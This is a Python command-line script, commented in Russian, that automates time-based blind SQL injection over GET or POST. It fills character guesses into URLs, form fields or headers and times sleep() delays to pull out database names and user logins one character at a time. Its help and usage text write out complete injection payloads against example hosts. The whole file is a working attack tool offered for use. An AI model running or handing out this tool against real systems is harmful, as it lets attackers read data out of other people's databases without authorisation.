from timeit import default_timer as timer  # библиотека измерения времени
import requests  # библиотека HTTP запросов
import argparse
import sys

parser = argparse.ArgumentParser(description='blind sql injection')
parser.add_argument('-get', help='HTTP GET method. Example: python3 blind_sql.py -get -u "http://example.com:1337?id=1 \
and (case when ASCII(substring((SELECT database() limit 0,1), {POSITION}, 1))={SYMBOL} THEN sleep(3) END) -- -" ',
                    action="store_true")
parser.add_argument('-post',
                    help='HTTP POST method. Example: python3 blind_sql.py -post -u "http://example.com:1337" -d "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" ',
                    action="store_true")
parser.add_argument('-u', '--URL', type=str, help='Enter URL Example: --URL "http://192.168.0.1/"', )
parser.add_argument('-d', '--Data', action='append', nargs='+',
                    help='Data string to be sent through POST in format kay=value (e.g. -d "id=1337" "name=value\' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" )')
parser.add_argument('-H', '--Header', action='append', nargs='+',
                    help='Headers for a POST request (e.g. "-H "Content-Type: application/json" -H "Authorization: Bearer token {SYMBOL}" ")')
parser.add_argument('-t', '--Type', default='ASCII', type=str, help='Type strings Example: -t HEX', )
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode. Example: blind_sql.py -get -u "http://example.com:1337?id=1 -v ', )
parser.add_argument('--timeout', type=float, default=2, help='Set the request timeout in seconds')
parser.add_argument('--show-request', action='store_true', help='Show the request', )
parser.usage= """ Примеры использования:

python3 main.py -get -u "http://192.168.0.1/?id=admin' and (if((substring((SELECT HEX(login) FROM users limit 0,1), {POSITION}, 1)='{SYMBOL}'), sleep(2), 0))#" -v -t HEX -H "Cookie: SessionId=qwerty"
python3 main.py -post -u "http://192.168.0.1/" -d "id=1337" "name=value' and IF(ASCII(substring((SELECT database()), {POSITION}, 1)) = {SYMBOL},sleep(0.025),1) #" -v -H "Cookie: SessionId=qwerty" 
python3 main.py -post -u "http://192.168.0.1/" -d "id=1337" "name=value" -v -H "Cookie: id=qwerty' and (if((substring((SELECT HEX(login) FROM users limit 0,1), {POSITION}, 1)='{SYMBOL}'), sleep(2), 0))#" 


"""
args = parser.parse_args()


def greetings():
    """Функция отображает приветствие пользователя"""
    print('=' * 40)
    print('''
.______    __       __  .__   __.  _______  
|   _  \  |  |     |  | |  \ |  | |       \ 
|  |_)  | |  |     |  | |   \|  | |  .--.  |
|   _  <  |  |     |  | |  . `  | |  |  |  |
|  |_)  | |  `----.|  | |  |\   | |  '--'  |
|______/  |_______||__| |__| \__| |_______/ 
                                            
     _______.  ______      __       __  
    /       | /  __  \    |  |     |  | 
   |   (----`|  |  |  |   |  |     |  | 
    \   \    |  |  |  |   |  |     |  | 
.----)   |   |  `--'  '--.|  `----.|  | 
|_______/     \_____\_____\_______||__| 

    ''')
    print('=' * 40)


def blind_sql(length_result, delay_time):
    i = 1  # начальное значение инкремента
    print('Print result:')

    while (i <= length_result):  # Цикл while будет выполняться пока не дойдем до конца возможной длинны
        if args.verbose:
            print('i:', i)
        for char in dictionary:  # Цикл for по нашему словарю dictionary
            start_time = timer()  # Начальное время
            if args.get == True:
                headers = {}
                if args.Header:  # если есть headers, тогда подготовь их для отправки
                    for header_list in args.Header:
                        for header in header_list:
                            key, value = header.split(':')
                            headers[key.strip()] = value.strip().format(POSITION=i, SYMBOL=char)

                if args.show_request:
                    print(f'URL:{args.URL}, Header:{headers}')

                res = requests.get(args.URL.format(POSITION=i, SYMBOL=char), headers=headers)

            elif args.post == True:
                headers = {}
                if args.Header:  # если есть headers, тогда подготовь их для отправки
                    for header_list in args.Header:
                        for header in header_list:
                            key, value = header.split(':')
                            headers[key.strip()] = value.strip().format(POSITION=i, SYMBOL=char)

                post_data = {}
                if args.Data:
                    for data_list in args.Data:
                        for data in data_list:
                            key, value = data.split('=', 1)
                            post_data[key] = value.format(POSITION=i, SYMBOL=char)

                if args.show_request:
                    print(f'URL:{args.URL}, Header:{headers}, Data:{post_data}')

                res = requests.post(args.URL, headers=headers, data=post_data)
                # функция format подставляет значения из i и char в запрос вместо {}
            end_time = timer()  # Конечное время
            time = end_time - start_time  # Затраченное время
            if args.verbose:
                print(chr(char),
                    time)  # просмотр всех результатов для определения подходящего времени переменной time для вывода релевантных результатов
            if time > delay_time:  # вывод только релевантных результатов
                if args.verbose or args.show_request:
                    if args.Type.upper() == 'HEX':
                        print(char, end='\n', flush=True)
                    else:
                        print(chr(char), end='\n', flush=True)
                else:
                    if args.Type.upper() == 'HEX':
                        print(char, end='', flush=True)
                    else:
                        print(chr(char), end='', flush=True)
                break
        i += 1  # Двигаемся далее


if __name__ == "__main__":
    try:
        greetings()
        length_result = int(input('Input length: '))  # Возможная длинна строки
        delay_time = float(args.timeout)  # если ответ приходит дольше - значит букву угадали

        if args.Type.upper() == 'HEX':
            dictionary = list(range(0, 10)) + list(range(ord('A'), ord('F') + 1))
        else:
            dictionary = list(range(45, 58)) + list(range(95, 126))  # Список кодов ASCII возможных симолов
        print(dictionary)

        if not args.get and not args.post:
            parser.error('Argument not specified. Use -get or -post')

        blind_sql(length_result, delay_time)

    except KeyboardInterrupt:
        print("""
.______   ____    ____  _______ 
|   _  \  \   \  /   / |   ____|
|  |_)  |  \   \/   /  |  |__   
|   _  <    \_    _/   |   __|  
|  |_)  |     |  |     |  |____ 
|______/      |__|     |_______|

        """)
        sys.exit(0)
